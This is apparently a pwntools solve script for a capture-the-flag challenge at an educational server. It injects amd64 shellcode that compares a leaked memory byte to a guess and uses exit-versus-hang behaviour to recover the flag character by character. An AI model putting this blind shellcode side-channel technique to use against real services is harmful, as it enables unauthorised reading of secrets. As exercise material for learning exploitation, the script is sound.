from pwn import *

# r = process('./chal')
context.arch = 'amd64'

flag = ''
shift_count = 0
while shift_count < 8:
    guess = 0x20
    while guess < 0x80 :
        # r = process('./chal')
        r = remote('edu-ctf.zoolab.org',10002)
        shellcode = asm('''
            mov r10, r13
            add r10, 0x2db7
            mov rax, [r10]
            mov cl, ''' + str(guess) + '''
            shr rax, ''' + str(8*shift_count) + '''
        Compare:
            cmp al, cl
            je the_same
        infinity1:
            jmp infinity1
        the_same:
            mov rax, 0x3c
            mov rdi, 0
            syscall
        ''')
        raw_input()
        r.sendafter(b"code\n\x00", shellcode)
        try :
            # If compare not correct, guess++ and access to infinity loop
            r.recv(timeout=0.2)
            print('not the same')
            guess += 1
        except:
            # If compare correct, pwntool will break out
            print('the same')
            break
        raw_input()
        r.close()
    
    shift_count += 1
    flag += chr(guess)
print(flag)
r.interactive()